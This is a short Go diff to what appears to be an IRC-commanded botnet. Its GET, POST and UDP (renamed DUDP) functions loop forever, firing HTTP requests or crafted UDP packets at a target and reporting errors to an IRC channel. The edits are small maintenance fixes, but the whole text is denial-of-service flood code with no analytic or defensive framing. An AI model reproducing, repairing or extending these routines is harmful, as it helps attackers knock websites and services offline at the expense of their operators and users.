@@ -28,6 +28,7 @@ func GET(getTarget, set_chan string, reportIRC net.Conn) {
 		IRC_Report(reportIRC, set_chan, err.Error())
 	}
 	_get := &http.Client{}
+	defer get_request.Body.Close()
 
 	for {
 		for i := range agent_array {
@@ -51,6 +52,7 @@ func POST(postTarget, set_chan string, reportIRC net.Conn) {
 		IRC_Report(reportIRC, set_chan, err.Error())
 	}
 	_post := &http.Client{}
+	defer post_request.Body.Close()
 
 	for {
 		_post.Do(post_request)
@@ -69,7 +71,7 @@ func udp_packetCraft(udpTarget, set_chan, port string, buffer []byte, reportIRC 
 	udp.Close()
 }
 
-func UDP(udpTarget, size, set_chan string, reportIRC net.Conn) {
+func DUDP(udpTarget, size, set_chan string, reportIRC net.Conn) {
 	for {
 		_size, _ := strconv.Atoi(size)
 		if _size <= 0 || _size > 700 {
